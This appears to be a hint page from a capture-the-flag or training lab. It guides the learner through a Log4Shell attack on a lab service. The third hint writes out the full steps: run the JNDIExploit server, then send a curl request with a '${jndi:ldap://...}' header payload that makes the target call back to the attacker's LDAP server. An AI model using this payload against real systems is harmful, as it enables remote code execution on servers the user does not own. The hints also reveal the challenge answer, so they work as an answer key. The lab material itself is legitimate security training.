## HINTS

### HINT 1

To find your IP address, you can run many commands in the Linux terminal. Maybe there’s some way to use the hostname command to get what you want?

If you’re having trouble with JNDIExploit, maybe try looking at the <code>-h</code> flag?

### HINT 2

<code>hostname -I</code> will give you your private IP address.

<code>java –jar JNDIExploit-1.2-SNAPSHOT.jar -i PRIVATEIPADDRESS</code> will start the server properly.

Triple-check to make sure you’re using that IP address.

The answer is the <i>whole last line</i> from the Terminal window where you first ran the JNDIExploit program. Punctuation and all.

### HINT 3

1. Open a Terminal Emulator window

2. Run <code>hostname -I</code> to get your ip address

3. Run <code>java –jar JNDIExploit-1.2-SNAPSHOT.jar -i YOURIP</code>

4. Open another window and run <code>curl http://sudosingles-optimizer -H 'X-Api-Version: ${jndi:ldap://YOURIP:1389/Basic/SpringEcho}'</code>

5. If you are successful, you should see a line that looks like the following show up in your original terminal window: <code>[+] Response code: 200</code>
